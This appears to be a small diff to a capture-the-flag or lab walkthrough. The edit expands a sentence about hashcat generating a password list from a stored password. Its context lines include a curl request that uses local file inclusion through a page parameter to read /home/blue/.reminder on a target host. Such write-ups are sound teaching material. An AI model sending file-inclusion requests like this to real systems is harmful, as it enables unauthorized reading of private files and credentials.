@@ -93,7 +93,7 @@ cat passlist.txt
 rm passlist.txt
 sudo apt-get remove hashcat -y
 ```
-###### Wow, we see hashcat creating a password list from one password
+###### Wow, we see hashcat creating a password list from one password that is stored in .reminder file
 ```
 curl http://target-ip/index.php?page=file:///home/blue/.reminder
 ```
